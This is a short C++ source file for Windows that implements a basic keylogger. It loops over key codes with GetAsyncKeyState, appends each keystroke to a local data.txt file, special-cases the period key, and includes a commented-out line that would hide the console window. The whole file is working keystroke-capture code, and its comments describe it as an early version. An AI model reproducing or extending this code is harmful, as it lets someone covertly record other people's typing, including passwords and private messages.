#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

//functions used:
void AddKey(string input);
bool SpecialCases(int key);


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//cout << "hello";
	//StartLog("hi");

	char InputChar;

	for (;;)
	{
		Sleep(10);
		for (int InputChar=8; InputChar<= 220; InputChar++)
		{
			if (GetAsyncKeyState(InputChar) == -32767) 
			{
				if (SpecialCases(InputChar) == false)
				{
					fstream DataLog;
					DataLog.open("data.txt", fstream::app);

					if (DataLog.is_open())
					{
						DataLog << char(InputChar);
						DataLog.close();
					}
				}
			}
		}
	}
}

	


//Pretty self explanatory. File is opened and the string inputted is entered.
//Since its still an initial phase it will only print "hi" into the txt accordng to main.
void AddKey(string input)
{
	fstream DataLog;
	DataLog.open("data.txt", fstream::app);

	if (DataLog.is_open())
	{
		DataLog << input;
		DataLog.close();
	}
}

//Here we can find all the special cases keys. For example, the period key
//would not show up proberly in the log. This function fixes it all.
bool SpecialCases(int key)
{
	switch (key) 
	{
	//For the period key ( '.' )
	case 0xBE:
		AddKey(".");
		return true;

	default: 
		return false;
	}
}